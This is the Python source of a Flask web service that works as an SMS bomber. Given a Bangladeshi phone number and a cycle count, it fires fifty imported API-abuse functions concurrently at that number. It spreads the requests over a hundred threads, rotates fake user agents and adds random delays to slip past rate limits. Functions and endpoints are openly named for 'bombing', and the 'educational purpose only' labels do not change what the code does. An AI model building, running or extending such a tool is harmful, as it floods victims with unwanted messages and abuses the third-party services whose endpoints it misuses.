import time
import random
import asyncio
import aiohttp
from concurrent.futures import ThreadPoolExecutor, ProcessPoolExecutor
from flask import Flask, request, jsonify, make_response
from flask_cors import CORS
from functools import lru_cache
from fake_useragent import UserAgent
import hashlib

from api.utils import random_string
from api.batch1 import *
from api.batch2 import *
from api.batch3 import *
from api.batch4 import *
from api.batch5 import *

app = Flask(__name__)
CORS(app)

# Cache configuration
CACHE_TIMEOUT = 300  # 5 minutes cache
response_cache = {}

# User agent generator with caching
ua = UserAgent()
ua_cache = []

def get_random_ua():
    """Get random user agent with caching"""
    if not ua_cache:
        for _ in range(20):
            ua_cache.append(ua.random)
    return random.choice(ua_cache)

# API Functions with their types
API_FUNCTIONS = [
    (api_1, "Standard"),
    (api_2, "Flash"),
    (api_3, "Marketing"),
    (api_4, "Transactional"),
    (api_5, "Promotional"),
    (api_6, "Bulk"),
    (api_7, "OTP"),
    (api_8, "Voice"),
    (api_9, "International"),
    (api_10, "Premium"),
    (api_11, "Short Code"),
    (api_12, "Long Code"),
    (api_13, "Scheduled"),
    (api_14, "Auto-reply"),
    (api_15, "Two-way"),
    (api_16, "Group"),
    (api_17, "Template"),
    (api_18, "Custom"),
    (api_19, "Dynamic"),
    (api_20, "Survey"),
    (api_21, "Alert"),
    (api_22, "Notification"),
    (api_23, "Reminder"),
    (api_24, "Confirmation"),
    (api_25, "Verification"),
    (api_26, "Authentication"),
    (api_27, "Password Reset"),
    (api_28, "Order"),
    (api_29, "Delivery"),
    (api_30, "Tracking"),
    (api_31, "Location"),
    (api_32, "Emergency"),
    (api_33, "Broadcast"),
    (api_34, "Interactive"),
    (api_35, "Keyword"),
    (api_36, "Opt-in"),
    (api_37, "Opt-out"),
    (api_38, "Subscription"),
    (api_39, "Unsubscribe"),
    (api_40, "Campaign"),
    (api_41, "Analytics"),
    (api_42, "Report"),
    (api_43, "Dashboard"),
    (api_44, "API SMS"),
    (api_45, "Webhook"),
    (api_46, "Callback"),
    (api_47, "Web SMS"),
    (api_48, "Mobile SMS"),
    (api_49, "Desktop SMS"),
    (api_50, "Cloud")
]

def get_cache_key(number, req_count):
    """Generate cache key for requests"""
    cache_str = f"{number}_{req_count}"
    return hashlib.md5(cache_str.encode()).hexdigest()

def call_single_api(api_func, number, pgen=None, egen=None, did=None, did2=None, name=None):
    """Execute a single API call with optimized parameters"""
    try:
        # Add small random delay to prevent rate limiting
        time.sleep(random.uniform(0.01, 0.05))
        
        # Handle different API parameter requirements
        if api_func in [api_9]:
            result = api_func(number, pgen, egen, did, name)
        elif api_func in [api_31]:
            result = api_func(number, egen, name)
        elif api_func in [api_33]:
            result = api_func(number, pgen, name)
        elif api_func in [api_37, api_39]:
            result = api_func(number, pgen, egen, name)
        else:
            result = api_func(number)
        
        if result and hasattr(result, 'status_code'):
            return result.status_code == 200
        return False
    except Exception:
        return False

def execute_bombing(number, req_count):
    """Execute bombing with fast response and minimal data"""
    total_success = 0
    total_attempts = 0
    working_count = 0
    
    start_time = time.time()
    
    for cycle in range(req_count):
        # Generate random strings
        pgen = random_string("?n?n?n?n?n?n?n?n?n?n?n?n")
        egen = random_string("?n?n?n?n?n?n?n?n")
        did = random_string("?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i")
        name = random_string("?l?l?l?l?l?l")
        
        cycle_success = 0
        
        with ThreadPoolExecutor(max_workers=100) as executor:
            futures = []
            for api_func, _ in API_FUNCTIONS:
                future = executor.submit(call_single_api, api_func, number, pgen, egen, did, None, name)
                futures.append(future)
            
            for future in futures:
                result = future.result()
                total_attempts += 1
                if result:
                    total_success += 1
                    cycle_success += 1
        
        # Count working APIs (APIs that succeeded at least once)
        if cycle_success > working_count:
            working_count = cycle_success
        
        # Minimal delay between cycles
        if cycle < req_count - 1:
            time.sleep(1)
    
    execution_time = time.time() - start_time
    success_rate = (total_success / total_attempts * 100) if total_attempts > 0 else 0
    
    # Return minimal but informative response
    return {
        "success": True,
        "target": number,
        "stats": {
            "sent": total_success,
            "total": total_attempts,
            "rate": round(success_rate, 1),
            "working": working_count,
            "time": round(execution_time, 2)
        },
        "cycles": req_count
    }

@app.route('/', methods=['GET'])
def root():
    # Get parameters
    number = request.args.get('number')
    req_count = request.args.get('req')
    
    # Show usage guide if no parameters
    if not number and not req_count:
        return jsonify({
            "error": False,
            "message": "SMS API Service - Educational Purpose",
            "usage": {
                "endpoint": "/?number=PHONE&req=CYCLES",
                "example": "/?number=01712345678&req=5",
                "params": {
                    "number": "11 digit BD number (required)",
                    "req": "Number of cycles (optional, default: 1)"
                }
            },
            "response": {
                "success": "boolean",
                "target": "phone_number",
                "stats": {
                    "sent": "successful_sms_count",
                    "total": "total_attempts",
                    "rate": "success_rate_percent",
                    "working": "working_apis_count",
                    "time": "execution_time_seconds"
                },
                "cycles": "cycles_completed"
            },
            "note": "⚠️ Educational purpose only"
        }), 200
    
    # Validate number
    if not number:
        return jsonify({
            "success": False,
            "error": "Missing phone number",
            "message": "Please provide 'number' parameter"
        }), 400
    
    # Clean and validate number
    number = str(number).strip()
    if not number.isdigit() or len(number) != 11 or not number.startswith('01'):
        return jsonify({
            "success": False,
            "error": "Invalid number",
            "message": "Must be 11 digits starting with 01 (e.g., 01712345678)"
        }), 400
    
    # Validate request count
    if not req_count:
        req_count = 1
    else:
        try:
            req_count = int(req_count)
            if req_count < 1:
                req_count = 1
            if req_count > 50:  # Limit for performance
                req_count = 50
        except ValueError:
            return jsonify({
                "success": False,
                "error": "Invalid request count",
                "message": "'req' must be a number"
            }), 400
    
    # Check cache for identical requests (within timeout)
    cache_key = get_cache_key(number, req_count)
    if cache_key in response_cache:
        cached_time, cached_response = response_cache[cache_key]
        if time.time() - cached_time < CACHE_TIMEOUT:
            return jsonify(cached_response), 200
    
    try:
        # Execute bombing
        result = execute_bombing(number, req_count)
        
        # Cache the result
        response_cache[cache_key] = (time.time(), result)
        
        # Clean old cache entries
        if len(response_cache) > 100:
            old_keys = [k for k, (t, _) in response_cache.items() if time.time() - t > CACHE_TIMEOUT]
            for k in old_keys:
                del response_cache[k]
        
        return jsonify(result), 200
        
    except Exception as e:
        return jsonify({
            "success": False,
            "error": "Execution failed",
            "message": str(e) if app.debug else "Internal server error"
        }), 500

# Fast response endpoint with minimal data
@app.route('/fast', methods=['GET'])
def fast_bomb():
    """Even faster endpoint with minimal processing"""
    number = request.args.get('number')
    req_count = request.args.get('req', '1')
    
    if not number:
        return jsonify({"error": "Number required"}), 400
    
    try:
        req_count = min(int(req_count), 20)  # Limit to 20 cycles for speed
    except:
        req_count = 1
    
    # Quick validation
    if not (number.isdigit() and len(number) == 11):
        return jsonify({"error": "Invalid number"}), 400
    
    # Execute with minimal overhead
    result = execute_bombing(number, req_count)
    return jsonify(result), 200

# Health check endpoint
@app.route('/health', methods=['GET'])
def health():
    return jsonify({
        "status": "active",
        "apis": len(API_FUNCTIONS),
        "cache": len(response_cache),
        "time": time.time()
    }), 200

# Clear cache endpoint
@app.route('/clear-cache', methods=['POST'])
def clear_cache():
    response_cache.clear()
    return jsonify({"success": True, "message": "Cache cleared"}), 200

# Error handlers
@app.errorhandler(404)
def not_found(error):
    return jsonify({
        "success": False,
        "error": "Not found",
        "message": "Use /?number=017xxxxxxxx&req=1"
    }), 404

@app.errorhandler(500)
def internal_error(error):
    return jsonify({
        "success": False,
        "error": "Server error",
        "message": "Please try again"
    }), 500

# Gzip compression for faster responses
@app.after_request
def after_request(response):
    response.headers.add('Accept-Ranges', 'bytes')
    response.headers.add('Cache-Control', 'no-cache, no-store, must-revalidate')
    response.headers.add('Expires', '0')
    response.headers.add('Pragma', 'no-cache')
    response.headers.add('X-Response-Time', str(time.time()))
    return response

if __name__ == '__main__':
    print("=" * 50)
    print("🚀 SMS API Service - Optimized Version")
    print("=" * 50)
    print(f"📊 Total APIs: {len(API_FUNCTIONS)}")
    print(f"⚡ Fast endpoint: http://0.0.0.0:5000/fast?number=017xxxx&req=5")
    print(f"💚 Health check: http://0.0.0.0:5000/health")
    print("=" * 50)
    print("⚠️  EDUCATIONAL PURPOSE ONLY")
    print("=" * 50)
    
    # Run with optimized settings
    app.run(
        host='0.0.0.0',
        port=5000,
        debug=False,
        threaded=True,
        use_reloader=False  # Disable reloader for better performance
    )
